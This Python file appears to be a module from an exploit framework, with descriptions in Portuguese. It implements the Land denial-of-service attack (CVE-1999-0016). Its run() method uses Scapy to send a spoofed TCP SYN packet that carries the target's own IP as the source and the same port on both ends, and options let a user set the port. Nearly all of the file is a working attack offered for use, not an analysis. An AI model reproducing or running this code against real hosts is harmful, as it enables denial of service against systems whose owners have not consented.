from scapy.all import *

class exploit:
  _name = "Land (CVE-1999-0016)"
  _descriptions = ''' 
Este modulo explora uma vulnerabilidade encontrada em diversos sistemas operacionais publicada
em 01/12/1997. Ao enviar um pacote TCP SYS em que o endereço IP e a porta são os mesmos para os
hosts de origem e de destino, causa um loop infinito no processo de handshake, impedindo a
conexão com um host legítimo.
  '''
  _references = """
https://www.cvedetails.com/cve/CVE-1999-0016 
  """
  _port = None

  def __init__(self):
    self._port = 1234

  def run(self, target):
    print("Run exploit ...")
    send(IP(dst=target, src=target)/TCP(sport = self._port, dport=self._port, flags='S'))

  def show_details(self):
    print("""
Name:
............
%s

Description:
.............
%s

References:
............
%s
""" %(self._name, self._descriptions, self._references))

  def show_options(self):
    print("""
Options:
........
Name      Value             Descriptions
....      .....             ............
port      %d                The destination and source port.
""" %self._port)
  
  def set_options(self, command_str):
    if "port" in command_str:
      port = int(command_str.replace("port ", ""))
      if port >= 0 and port <= 65535:
        self._port = port
      else:
        print("%d: invalid port")
    else:
      print("%s: invalid option" %command_str)